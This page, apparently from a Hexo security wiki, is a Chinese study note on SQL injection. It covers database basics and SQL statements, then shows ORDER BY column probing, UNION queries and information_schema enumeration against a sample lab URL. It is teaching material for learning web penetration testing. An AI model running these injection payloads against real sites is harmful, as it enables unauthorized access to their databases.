@@ -1,0 +1,720 @@
+<!DOCTYPE html>
+<html lang="zn">
+<head>
+    <meta charset="utf-8">
+    
+    <title>第五节 SQL注入 | s40d1&#39;s Wiki</title>
+    
+    
+        <meta name="keywords" content="SQL注入">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="description" content="0X00 数据库相关概念数据（DATA）：图像、语音、文字在计算机系统中，各种字母、数字符号的组合、语音、图形、图像等统称为数据。 数据库(Database)：Access、MSSQL、Oracle、SQLITE、MySQL等数据库是按照数据结构来组织、存储和管理数据的“仓库”。 数据库管理系统(DBMS)：Access、MSSQL、Oracle、SQLITE、MySQL等数据库管理系统(data">
+<meta property="og:type" content="article">
+<meta property="og:title" content="第五节 SQL注入">
+<meta property="og:url" content="https://s40d1.github.io/wiki/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Web%E6%B8%97%E9%80%8F/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E7%AC%AC%E4%BA%94%E8%8A%82%20SQL%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:site_name" content="s40d1&#39;s Wiki">
+<meta property="og:description" content="0X00 数据库相关概念数据（DATA）：图像、语音、文字在计算机系统中，各种字母、数字符号的组合、语音、图形、图像等统称为数据。 数据库(Database)：Access、MSSQL、Oracle、SQLITE、MySQL等数据库是按照数据结构来组织、存储和管理数据的“仓库”。 数据库管理系统(DBMS)：Access、MSSQL、Oracle、SQLITE、MySQL等数据库管理系统(data">
+<meta property="og:image" content="https://note.youdao.com/yws/public/resource/3748176b04869b8910a652ea5b2451c7/5BAEC8D2679B4E2587677ACFB1717091?ynotemdtimestamp=1595561542771">
+<meta property="og:image" content="https://note.youdao.com/yws/public/resource/3748176b04869b8910a652ea5b2451c7/82D676E0EA5942948556A03E0788931C?ynotemdtimestamp=1595561542771">
+<meta property="og:image" content="https://note.youdao.com/yws/public/resource/3748176b04869b8910a652ea5b2451c7/870B902796394F1DA278A5F4324E10B5?ynotemdtimestamp=1595561542771">
+<meta property="og:image" content="https://note.youdao.com/yws/public/resource/6f0c7c0edbc9314143dc3806dafd94fd/8F1AEAD8566146EE9A90916A2C37B9C5?ynotemdtimestamp=1595558496664">
+<meta property="og:image" content="https://note.youdao.com/yws/public/resource/6f0c7c0edbc9314143dc3806dafd94fd/C1572B244C5D4E3E8B0DF8004FB9CBE2?ynotemdtimestamp=1595558496664">
+<meta property="og:image" content="https://note.youdao.com/yws/public/resource/6f0c7c0edbc9314143dc3806dafd94fd/6923DFA4ACDD48E7A9C4A3219C107972?ynotemdtimestamp=1595558496664">
+<meta property="og:image" content="https://note.youdao.com/yws/public/resource/6f0c7c0edbc9314143dc3806dafd94fd/DDB4F108E77041FEBF5238C7929C1776?ynotemdtimestamp=1595558496664">
+<meta property="og:image" content="https://note.youdao.com/yws/public/resource/6f0c7c0edbc9314143dc3806dafd94fd/4B275C3B21174DADB1616656887D7722?ynotemdtimestamp=1595558496664">
+<meta property="og:image" content="https://note.youdao.com/yws/public/resource/6f0c7c0edbc9314143dc3806dafd94fd/21F57CB066E04D52915A57F6A19D4A71?ynotemdtimestamp=1595558496664">
+<meta property="og:image" content="https://note.youdao.com/yws/public/resource/6f0c7c0edbc9314143dc3806dafd94fd/FCB7873DCC7A4EF6A51696F7C7F4CB04?ynotemdtimestamp=1595558496664">
+<meta property="og:image" content="https://note.youdao.com/yws/public/resource/6f0c7c0edbc9314143dc3806dafd94fd/EDA3549E47FB46E8AC18073A3C83BB12?ynotemdtimestamp=1595558496664">
+<meta property="og:image" content="https://note.youdao.com/yws/public/resource/6f0c7c0edbc9314143dc3806dafd94fd/F05FF980BF73460B9833A6E4D895BA20?ynotemdtimestamp=1595558496664">
+<meta property="og:image" content="https://note.youdao.com/yws/public/resource/6f0c7c0edbc9314143dc3806dafd94fd/5B2998FC7962433DB6089CB48E7BC245?ynotemdtimestamp=1595558496664">
+<meta property="og:image" content="https://note.youdao.com/yws/public/resource/6f0c7c0edbc9314143dc3806dafd94fd/0BD9BBB87D38446080CE221597DF4D5A?ynotemdtimestamp=1595558496664">
+<meta property="og:image" content="https://note.youdao.com/yws/public/resource/6f0c7c0edbc9314143dc3806dafd94fd/C533AEB58240440AA06533BC32663BE0?ynotemdtimestamp=1595558496664">
+<meta property="og:image" content="https://note.youdao.com/yws/public/resource/6f0c7c0edbc9314143dc3806dafd94fd/704A3E2C8BE74F35B43432356DBE8B10?ynotemdtimestamp=1595558496664">
+<meta property="og:image" content="https://note.youdao.com/yws/public/resource/6f0c7c0edbc9314143dc3806dafd94fd/7C28C9A86C1245F697C8734A02E08A54?ynotemdtimestamp=1595558496664">
+<meta property="og:image" content="https://note.youdao.com/yws/public/resource/6f0c7c0edbc9314143dc3806dafd94fd/74BB051DAC4B41A1B65A36F24C8D81A4?ynotemdtimestamp=1595558496664">
+<meta property="og:image" content="https://note.youdao.com/yws/public/resource/6f0c7c0edbc9314143dc3806dafd94fd/7C47BA73990B4C7FBB3A23EF49AE31D6?ynotemdtimestamp=1595558496664">
+<meta property="article:published_time" content="2020-07-24T03:35:37.000Z">
+<meta property="article:modified_time" content="2020-07-24T03:35:41.384Z">
+<meta property="article:author" content="s40d1">
+<meta property="article:tag" content="SQL注入">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://note.youdao.com/yws/public/resource/3748176b04869b8910a652ea5b2451c7/5BAEC8D2679B4E2587677ACFB1717091?ynotemdtimestamp=1595561542771">
+    
+
+    
+        <link rel="alternate" href="/atom.xml" title="s40d1&#39;s Wiki" type="application/atom+xml">
+    
+
+    
+        <link rel="icon" href="/favicon.ico">
+    
+
+    
+<link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
+
+    
+<link rel="stylesheet" href="/libs/open-sans/styles.css">
+
+    
+<link rel="stylesheet" href="/libs/source-code-pro/styles.css">
+
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+<script src="/libs/jquery/2.1.3/jquery.min.js"></script>
+
+    
+<script src="/libs/jquery/plugins/cookie/1.4.1/jquery.cookie.js"></script>
+
+    
+    
+        
+<link rel="stylesheet" href="/libs/lightgallery/css/lightgallery.min.css">
+
+    
+    
+        
+<link rel="stylesheet" href="/libs/justified-gallery/justifiedGallery.min.css">
+
+    
+    
+    
+    
+
+
+    
+        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+<meta name="generator" content="Hexo 4.2.1"></head>
+</html>
+<body>
+    <div id="container">
+        <header id="header">
+    <div id="header-main" class="header-inner">
+        <div class="outer">
+            <a href="/" id="logo">
+                <i class="logo"></i>
+                <span class="site-title">s40d1&#39;s Wiki</span>
+            </a>
+            <nav id="main-nav">
+                
+                    <a class="main-nav-link" href="/">首页</a>
+                
+                    <a class="main-nav-link" href="/archives">归档</a>
+                
+                    <a class="main-nav-link" href="/categories">分类</a>
+                
+                    <a class="main-nav-link" href="/tags">标签</a>
+                
+                    <a class="main-nav-link" href="/about">关于</a>
+                
+            </nav>
+            
+            <div id="search-form-wrap">
+
+    <form class="search-form">
+        <input type="text" class="ins-search-input search-form-input" placeholder="Cari">
+        <button type="submit" class="search-form-submit"></button>
+    </form>
+    <div class="ins-search">
+    <div class="ins-search-mask"></div>
+    <div class="ins-search-container">
+        <div class="ins-input-wrapper">
+            <input type="text" class="ins-search-input" placeholder="Type something...">
+            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: 'pos',
+            PAGES: 'Pages',
+            CATEGORIES: 'kategori',
+            TAGS: 'tag',
+            UNTITLED: '(Untitled)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+
+<script src="/js/insight.js"></script>
+
+
+</div>
+        </div>
+    </div>
+    <div id="main-nav-mobile" class="header-sub header-inner">
+        <table class="menu outer">
+            <tr>
+                
+                    <td><a class="main-nav-link" href="/">首页</a></td>
+                
+                    <td><a class="main-nav-link" href="/archives">归档</a></td>
+                
+                    <td><a class="main-nav-link" href="/categories">分类</a></td>
+                
+                    <td><a class="main-nav-link" href="/tags">标签</a></td>
+                
+                    <td><a class="main-nav-link" href="/about">关于</a></td>
+                
+                <td>
+                    
+    <div class="search-form">
+        <input type="text" class="ins-search-input search-form-input" placeholder="Cari">
+    </div>
+
+                </td>
+            </tr>
+        </table>
+    </div>
+</header>
+
+        <div class="outer">
+            
+            
+                <aside id="sidebar">
+   
+        
+    <div class="widget-wrap" id="categories">
+        <h3 class="widget-title">
+            <span>kategori</span>
+            &nbsp;
+            <a id="allExpand" href="#">
+                <i class="fa fa-angle-double-down fa-2x"></i>
+            </a>
+        </h3>
+        
+        
+        
+         <ul class="unstyled" id="tree"> 
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            CTF
+                        </a>
+                         <ul class="unstyled" id="tree">  <li class="file"><a href="/wiki/CTF/%E7%AC%AC%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0/">article title</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            代码审计
+                        </a>
+                         <ul class="unstyled" id="tree">  <li class="file"><a href="/wiki/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E7%AC%AC%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0/">article title</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            安全开发
+                        </a>
+                         <ul class="unstyled" id="tree"> 
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            正则表达式
+                        </a>
+                         <ul class="unstyled" id="tree">  <li class="file"><a href="/wiki/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F30%E5%88%86%E9%92%9F%E5%85%A5%E9%97%A840%E5%88%86%E9%92%9F%E8%BF%9B%E9%98%B6/">正则表达式30分钟入门40分钟进阶</a></li>  </ul> 
+                    </li> 
+                     </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            安全服务
+                        </a>
+                         <ul class="unstyled" id="tree"> 
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            风险评估
+                        </a>
+                         <ul class="unstyled" id="tree">  <li class="file"><a href="/wiki/%E5%AE%89%E5%85%A8%E6%9C%8D%E5%8A%A1/%E9%A3%8E%E9%99%A9%E8%AF%84%E4%BC%B0/%E9%A3%8E%E9%99%A9%E8%AF%84%E4%BC%B0%E7%9B%B8%E5%85%B3%E6%A6%82%E5%BF%B5/">风险评估相关概念</a></li>  </ul> 
+                    </li> 
+                     </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            攻防演练
+                        </a>
+                         <ul class="unstyled" id="tree">  <li class="file"><a href="/wiki/%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83/%E7%AC%AC%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0/">article title</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory open">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder-open"></i>
+                            &nbsp;
+                            渗透测试
+                        </a>
+                         <ul class="unstyled" id="tree"> 
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            IOT渗透
+                        </a>
+                         <ul class="unstyled" id="tree">  <li class="file"><a href="/wiki/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/IOT%E6%B8%97%E9%80%8F/%E7%AC%AC%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0/">article title</a></li>  <li class="file"><a href="/wiki/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/IOT%E6%B8%97%E9%80%8F/%E6%96%B0%E5%BB%BA%E6%96%87%E6%9C%AC%E6%96%87%E6%A1%A3/">Hello World</a></li>  <li class="file"><a href="/wiki/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/IOT%E6%B8%97%E9%80%8F/web%E5%88%9D%E7%BA%A7%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"></a></li>  <li class="file"><a href="/wiki/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/IOT%E6%B8%97%E9%80%8F/Windows%E7%B3%BB%E7%BB%9F%E7%9B%91%E6%8E%A7Sysmon/"></a></li>  <li class="file"><a href="/wiki/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/IOT%E6%B8%97%E9%80%8F/Windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8E%92%E6%9F%A5/"></a></li>  <li class="file"><a href="/wiki/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/IOT%E6%B8%97%E9%80%8F/%E7%97%85%E6%AF%92%E5%88%9D%E7%BA%A7%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"></a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory open">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder-open"></i>
+                            &nbsp;
+                            Web渗透
+                        </a>
+                         <ul class="unstyled" id="tree"> 
+                    <li class="directory open">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder-open"></i>
+                            &nbsp;
+                            学习笔记
+                        </a>
+                         <ul class="unstyled" id="tree">  <li class="file"><a href="/wiki/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Web%E6%B8%97%E9%80%8F/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E7%AC%AC%E4%B8%80%E8%8A%82%20HTTP%E8%AF%B7%E6%B1%82%E6%B5%81%E7%A8%8B/">第一节 HTTP请求流程</a></li>  <li class="file"><a href="/wiki/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Web%E6%B8%97%E9%80%8F/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E7%AC%AC%E4%BA%8C%E8%8A%82%20%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">第二节 信息收集</a></li>  <li class="file"><a href="/wiki/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Web%E6%B8%97%E9%80%8F/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E7%AC%AC%E5%9B%9B%E8%8A%82%20%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%EF%BC%88CSRF%EF%BC%89%E6%BC%8F%E6%B4%9E/">第四节 跨站请求伪造（CSRF）漏洞</a></li>  <li class="file active"><a href="/wiki/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Web%E6%B8%97%E9%80%8F/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E7%AC%AC%E4%BA%94%E8%8A%82%20SQL%E6%B3%A8%E5%85%A5/">第五节 SQL注入</a></li>  </ul> 
+                    </li> 
+                     </ul> 
+                    </li> 
+                     </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            红蓝对抗
+                        </a>
+                         <ul class="unstyled" id="tree">  <li class="file"><a href="/wiki/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E7%AC%AC%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0/">article title</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            风险评估
+                        </a>
+                         <ul class="unstyled" id="tree">  <li class="file"><a href="/wiki/%E9%A3%8E%E9%99%A9%E8%AF%84%E4%BC%B0/%E7%AC%AC%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0/">article title</a></li>  </ul> 
+                    </li> 
+                     </ul> 
+    </div>
+    <script>
+        $(document).ready(function() {
+            var iconFolderOpenClass  = 'fa-folder-open';
+            var iconFolderCloseClass = 'fa-folder';
+            var iconAllExpandClass = 'fa-angle-double-down';
+            var iconAllPackClass = 'fa-angle-double-up';
+            // Handle directory-tree expansion:
+            // 左键单独展开目录
+            $(document).on('click', '#categories a[data-role="directory"]', function (event) {
+                event.preventDefault();
+
+                var icon = $(this).children('.fa');
+                var expanded = icon.hasClass(iconFolderOpenClass);
+                var subtree = $(this).siblings('ul');
+                icon.removeClass(iconFolderOpenClass).removeClass(iconFolderCloseClass);
+                if (expanded) {
+                    if (typeof subtree != 'undefined') {
+                        subtree.slideUp({ duration: 100 });
+                    }
+                    icon.addClass(iconFolderCloseClass);
+                } else {
+                    if (typeof subtree != 'undefined') {
+                        subtree.slideDown({ duration: 100 });
+                    }
+                    icon.addClass(iconFolderOpenClass);
+                }
+            });
+            // 右键展开下属所有目录
+            $('#categories a[data-role="directory"]').bind("contextmenu", function(event){
+                event.preventDefault();
+                
+                var icon = $(this).children('.fa');
+                var expanded = icon.hasClass(iconFolderOpenClass);
+                var listNode = $(this).siblings('ul');
+                var subtrees = $.merge(listNode.find('li ul'), listNode);
+                var icons = $.merge(listNode.find('.fa'), icon);
+                icons.removeClass(iconFolderOpenClass).removeClass(iconFolderCloseClass);
+                if(expanded) {
+                    subtrees.slideUp({ duration: 100 });
+                    icons.addClass(iconFolderCloseClass);
+                } else {
+                    subtrees.slideDown({ duration: 100 });
+                    icons.addClass(iconFolderOpenClass);
+                }
+            })
+            // 展开关闭所有目录按钮
+            $(document).on('click', '#allExpand', function (event) {
+                event.preventDefault();
+                
+                var icon = $(this).children('.fa');
+                var expanded = icon.hasClass(iconAllExpandClass);
+                icon.removeClass(iconAllExpandClass).removeClass(iconAllPackClass);
+                if(expanded) {
+                    $('#sidebar .fa.fa-folder').removeClass('fa-folder').addClass('fa-folder-open')
+                    $('#categories li ul').slideDown({ duration: 100 });
+                    icon.addClass(iconAllPackClass);
+                } else {
+                    $('#sidebar .fa.fa-folder-open').removeClass('fa-folder-open').addClass('fa-folder')
+                    $('#categories li ul').slideUp({ duration: 100 });
+                    icon.addClass(iconAllExpandClass);
+                }
+            });  
+        });
+    </script>
+
+    
+    <div id="toTop" class="fa fa-angle-up"></div>
+</aside>
+            
+            <section id="main"><article id="post-渗透测试/Web渗透/学习笔记/第五节 SQL注入" class="article article-type-post" itemscope itemprop="blogPost">
+    <div class="article-inner">
+        
+        
+            <header class="article-header">
+                
+                    <div class="article-meta">
+                        
+    <div class="article-category">
+    	<i class="fa fa-folder"></i>
+        <a class="article-category-link" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a><i class="fa fa-angle-right"></i><a class="article-category-link" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Web%E6%B8%97%E9%80%8F/">Web渗透</a><i class="fa fa-angle-right"></i><a class="article-category-link" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Web%E6%B8%97%E9%80%8F/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">学习笔记</a>
+    </div>
+
+                        
+    <div class="article-tag">
+        <i class="fa fa-tag"></i>
+        <a class="tag-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a>
+    </div>
+
+                        
+    <div class="article-date">
+        <i class="fa fa-calendar"></i>
+        <a href="/wiki/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Web%E6%B8%97%E9%80%8F/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E7%AC%AC%E4%BA%94%E8%8A%82%20SQL%E6%B3%A8%E5%85%A5/">
+            <time datetime="2020-07-24T03:35:37.000Z" itemprop="datePublished">2020-07-24</time>
+        </a>
+    </div>
+
+
+                        
+                            <i class="fa fa-bar-chart"></i>
+                            <span id="busuanzi_container_site_pv"><span id="busuanzi_value_page_pv"></span></span>    
+                        
+                        
+                            <div class="article-meta-button">
+                                <a href="https://github.com/zthxxx/Wiki-site/raw/writing/source/_posts/渗透测试/Web渗透/学习笔记/第五节 SQL注入.md" target="_blank" rel="external nofollow noopener noreferrer"> Source </a>
+                            </div>
+                            <div class="article-meta-button">
+                                <a href="https://github.com/zthxxx/Wiki-site/edit/writing/source/_posts/渗透测试/Web渗透/学习笔记/第五节 SQL注入.md" target="_blank" rel="external nofollow noopener noreferrer"> Edit </a>
+                            </div>
+                            <div class="article-meta-button">
+                                <a href="https://github.com/zthxxx/Wiki-site/commits/writing/source/_posts/渗透测试/Web渗透/学习笔记/第五节 SQL注入.md" target="_blank" rel="external nofollow noopener noreferrer"> History </a>
+                            </div>
+                        
+                    </div>
+                
+                
+    
+        <h1 class="article-title" itemprop="name">
+            第五节 SQL注入
+        </h1>
+    
+
+            </header>
+        
+        
+        <div class="article-entry" itemprop="articleBody">
+        
+        
+            
+        
+        
+            <h1 id="0X00-数据库相关概念"><a href="#0X00-数据库相关概念" class="headerlink" title="0X00 数据库相关概念"></a>0X00 数据库相关概念</h1><h4 id="数据（DATA）：图像、语音、文字"><a href="#数据（DATA）：图像、语音、文字" class="headerlink" title="数据（DATA）：图像、语音、文字"></a>数据（DATA）：图像、语音、文字</h4><p>在计算机系统中，各种字母、数字符号的组合、语音、图形、图像等统称为数据。</p>
+<h4 id="数据库-Database-：Access、MSSQL、Oracle、SQLITE、MySQL等"><a href="#数据库-Database-：Access、MSSQL、Oracle、SQLITE、MySQL等" class="headerlink" title="数据库(Database)：Access、MSSQL、Oracle、SQLITE、MySQL等"></a>数据库(Database)：Access、MSSQL、Oracle、SQLITE、MySQL等</h4><p>数据库是按照数据结构来组织、存储和管理数据的“仓库”。</p>
+<h4 id="数据库管理系统-DBMS-：Access、MSSQL、Oracle、SQLITE、MySQL等"><a href="#数据库管理系统-DBMS-：Access、MSSQL、Oracle、SQLITE、MySQL等" class="headerlink" title="数据库管理系统(DBMS)：Access、MSSQL、Oracle、SQLITE、MySQL等"></a>数据库管理系统(DBMS)：Access、MSSQL、Oracle、SQLITE、MySQL等</h4><p>数据库管理系统(database management system)是一种操纵和管理数据库的软件，用于建立、使用和维护数据库。它对数据库进行统一的管理和控制，以保证数据库的安全性和完整性。</p>
+<h4 id="结构化查询语言-SQL-：DQL、DDL、DML、TCL、DCL"><a href="#结构化查询语言-SQL-：DQL、DDL、DML、TCL、DCL" class="headerlink" title="结构化查询语言(SQL)：DQL、DDL、DML、TCL、DCL"></a>结构化查询语言(SQL)：DQL、DDL、DML、TCL、DCL</h4><p>结构化查询语言(Structured Query Language)简称SQL，结构化查询语言是一种数据库查询和程序设计语言，用于存取数据以及查询、更新和管理关系数据库系统。</p>
+<h2 id="数据库常见的操作"><a href="#数据库常见的操作" class="headerlink" title="数据库常见的操作"></a>数据库常见的操作</h2><h2 id="增删改查：insert，update，delete，select"><a href="#增删改查：insert，update，delete，select" class="headerlink" title="- 增删改查：insert，update，delete，select"></a>- 增删改查：insert，update，delete，select</h2><p>查询user表的所有数据</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user;</span><br></pre></td></tr></table></figure>
+<p>查询user表“name”等于“admin”的数据；</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user where name&#x3D;&quot;admin&quot;;</span><br></pre></td></tr></table></figure>
+<p>往user表里面增加一个用户admin，并且密码为admin@123，电话1318888888</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into user values(&quot;admin&quot;,&quot;admin@123&quot;,&quot;13188888888&quot;);</span><br></pre></td></tr></table></figure>
+<p>更改admin用户的密码为password</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update user set password&#x3D;&quot;password&quot; where name&#x3D;&quot;admin&quot;;</span><br></pre></td></tr></table></figure>
+<p>删除新增admin用户所在的行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">delete from user where name&#x3D;&quot;admin&quot;;</span><br></pre></td></tr></table></figure>
+<h2 id="SQL-order-by-语句"><a href="#SQL-order-by-语句" class="headerlink" title="SQL order by 语句"></a>SQL order by 语句</h2><p>order by语句通常是用来做排序的，默认按照升序排序。<br>但是在SQL注入中order by主要用来判断当前表是有多少列，然后配合联合查询来爆数据。<br>order by用法：<a href="http://10.1.131.10/cms/show.php?id=35利用order" target="_blank" rel="external nofollow noopener noreferrer">http://10.1.131.10/cms/show.php?id=35利用order</a> by来看当前表有多少列。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;10.1.131.10&#x2F;cms&#x2F;show.php?id&#x3D;35 order by 10回显正常</span><br><span class="line">http:&#x2F;&#x2F;10.1.131.10&#x2F;cms&#x2F;show.php?id&#x3D;35 order by 15回显正常</span><br><span class="line">http:&#x2F;&#x2F;10.1.131.10&#x2F;cms&#x2F;show.php?id&#x3D;35 order by 16回显不正常</span><br></pre></td></tr></table></figure>
+<p>以上说明当前表有15列。</p>
+<h2 id="union联合查询"><a href="#union联合查询" class="headerlink" title="union联合查询"></a>union联合查询</h2><p>利用联合查询把2个表的数据合在一个表里面</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user union all select * from table2;</span><br></pre></td></tr></table></figure>
+<p>如果不想看到前面的查询内容而只想看到后面的内容，可以使前面的查询结果为false：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user where name&#x3D;1  union all select * from table2;</span><br></pre></td></tr></table></figure>
+<p>user表里面没有name=1的，所以前面的查询返回false</p>
+<h2 id="MySql数据库"><a href="#MySql数据库" class="headerlink" title="MySql数据库"></a>MySql数据库</h2><p>SQL注入中最常见利用的系统数据库，经常利用系统数据库配合union联合查询来获取数据库相关信息，因为系统数据库中所有信息都在这个数据库里面，比如所有数据库名、所有的表名、列名以及列名的数据库类型等，这里主要关注MYSQL系统数据库information_schema，关注系统数据库的表columns和schema表以及tables表：</p>
+<blockquote>
+<p>SCHEMATA表：提供了关于数据库的信息<br>COLUMNS表：给出了表中的列信息<br>TABLES表：给出了关于数据库中的表的信息</p>
+</blockquote>
+<h3 id="COLUMNS表查询数据库名"><a href="#COLUMNS表查询数据库名" class="headerlink" title="COLUMNS表查询数据库名"></a>COLUMNS表查询数据库名</h3><p>同表schemata一样，查询columns表里面的table_schema列一样可以得到所有数据库名：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select distinct table_schema from information_schema.columns;</span><br></pre></td></tr></table></figure>
+<h3 id="COLUMNS表查询列名"><a href="#COLUMNS表查询列名" class="headerlink" title="COLUMNS表查询列名"></a>COLUMNS表查询列名</h3><p>查询当前数据库所有列：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select distinct column_name from information_schema.columns;查询到当前有2232个列名</span><br></pre></td></tr></table></figure>
+<h3 id="COLUMNS表查询表名"><a href="#COLUMNS表查询表名" class="headerlink" title="COLUMNS表查询表名"></a>COLUMNS表查询表名</h3><p>查询当前所有表名：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select distinct table_name from information_schema.columns;查询结果当前473个表名</span><br></pre></td></tr></table></figure>
+<h3 id="TABLES表查询数据库名"><a href="#TABLES表查询数据库名" class="headerlink" title="TABLES表查询数据库名"></a>TABLES表查询数据库名</h3><p>同表columns以及schemata一样，查询tables表里面的table_schema列一样可以得到所有数据库名：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select distinct table_schema from information_schema.tables;</span><br></pre></td></tr></table></figure>
+<h3 id="TABLES表查询表名"><a href="#TABLES表查询表名" class="headerlink" title="TABLES表查询表名"></a>TABLES表查询表名</h3><p>同columns表一样，从tables表里面的所有表名：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select distinct table_name from information_schema.tables;</span><br></pre></td></tr></table></figure>
+<h3 id="MySQL函数"><a href="#MySQL函数" class="headerlink" title="MySQL函数"></a>MySQL函数</h3><p>SQL函数是在SQL注入中用的比较多的，经常利用SQL函数来判断数据库的版本，当前用户，当前用户权限以及数据库的安装路径等等，以下是常用的MYSQL函数：</p>
